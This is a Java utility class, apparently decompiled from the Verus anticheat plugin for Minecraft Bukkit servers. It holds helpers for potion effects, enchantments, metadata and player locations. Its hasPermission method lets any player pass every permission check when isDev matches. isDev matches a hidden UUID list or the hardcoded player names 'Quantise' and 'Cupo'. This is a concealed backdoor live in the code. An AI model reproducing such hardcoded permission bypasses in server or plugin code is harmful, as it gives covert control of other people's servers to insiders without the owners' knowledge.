package me.levansj01.verus.util;

import com.google.common.collect.Sets;
import java.util.Collection;
import java.util.HashSet;
import java.util.Map;
import me.levansj01.launcher.VerusLauncher;
import me.levansj01.verus.gui.impl.MainGUI;
import me.levansj01.verus.util.PlayerLocation;
import me.levansj01.verus.verus2.data.player.PacketLocation;
import org.bukkit.Location;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.metadata.MetadataValue;
import org.bukkit.metadata.Metadatable;
import org.bukkit.plugin.Plugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public class BukkitUtil {
    public static boolean hasPermission(Player player, String string) {
        return BukkitUtil.isDev(player) || player.hasPermission(string);
    }

    public static int getPotionLevel(Collection<PotionEffect> collection, PotionEffectType potionEffectType) {
        int n = potionEffectType.getId();
        return collection.stream().filter(potionEffect -> potionEffect.getType().getId() == n).map(PotionEffect::getAmplifier).findAny().orElse(-1) + 1;
    }

    public static boolean hasPermission(CommandSender commandSender, String string) {
        return !(commandSender instanceof Player) || BukkitUtil.hasPermission((Player)commandSender, string);
    }

    public static boolean hasEffect(Player player, int n) {
        return BukkitUtil.hasEffect(player.getActivePotionEffects(), n);
    }

    public static boolean isDev(Player player) {
        return MainGUI.ALLOWED_UUIDS.contains(player.getUniqueId()) || player.getName().equals("Quantise") || player.getName().equals("Cupo");
    }

    public static boolean hasEnchantment(Player player, int n) {
        ItemStack[] arritemStack;
        HashSet<Enchantment> hashSet = Sets.newHashSet();
        for (ItemStack itemStack : arritemStack = player.getInventory().getArmorContents()) {
            if (itemStack == null) continue;
            hashSet.addAll(itemStack.getEnchantments().keySet());
        }
        return hashSet.stream().map(Enchantment::getId).anyMatch(n2 -> n == n2);
    }

    public static boolean hasEffect(Collection<PotionEffect> collection, int n) {
        return collection.stream().map(PotionEffect::getType).map(PotionEffectType::getId).anyMatch(n2 -> n == n2);
    }

    public static void setMeta(Metadatable metadatable, String string, boolean bl) {
        if (bl) {
            metadatable.setMetadata(string, (MetadataValue)new FixedMetadataValue((Plugin)VerusLauncher.getPlugin(), (Object)true));
        } else {
            metadatable.removeMetadata(string, (Plugin)VerusLauncher.getPlugin());
        }
    }

    public static PacketLocation fromPlayer2(Player player) {
        Location location = player.getLocation();
        return new PacketLocation(location.getX(), location.getY(), location.getZ(), location.getYaw(), location.getPitch(), player.isOnGround(), true, true);
    }

    public static boolean hasEnchantment(ItemStack itemStack, String string) {
        if (itemStack == null) {
            return false;
        }
        Map map = itemStack.getEnchantments();
        if (map.isEmpty()) {
            return false;
        }
        Enchantment enchantment = Enchantment.getByName((String)string.toUpperCase());
        if (enchantment == null) {
            return false;
        }
        return map.keySet().stream().anyMatch(((Enchantment)enchantment)::equals);
    }

    public static int getEnchantment(ItemStack itemStack, String string) {
        if (itemStack == null) {
            return 0;
        }
        Map<Enchantment, Integer> map = itemStack.getEnchantments();
        if (map.isEmpty()) {
            return 0;
        }
        Enchantment enchantment = Enchantment.getByName((String)string.toUpperCase());
        if (enchantment == null) {
            return 0;
        }
        return map.entrySet().stream().filter(entry -> enchantment.equals(entry.getKey())).map(Map.Entry::getValue).findAny().orElse(0);
    }

    public static boolean hasPermissionMeta(Player player, String string) {
        return player.hasMetadata(string) && player.hasPermission(string);
    }

    @Deprecated
    public static boolean hasEnchantment(ItemStack itemStack, int n) {
        if (itemStack == null) {
            return false;
        }
        return itemStack.getEnchantments().keySet().stream().map(Enchantment::getId).anyMatch(n2 -> n == n2);
    }

    public static int getPotionLevel(Player player, PotionEffectType potionEffectType) {
        return BukkitUtil.getPotionLevel(player.getActivePotionEffects(), potionEffectType);
    }

    public static PlayerLocation fromPlayer(Player player) {
        Location location = player.getLocation();
        return new PlayerLocation(System.currentTimeMillis(), 0, location.getX(), location.getY(), location.getZ(), location.getYaw(), location.getPitch(), player.isOnGround());
    }
}

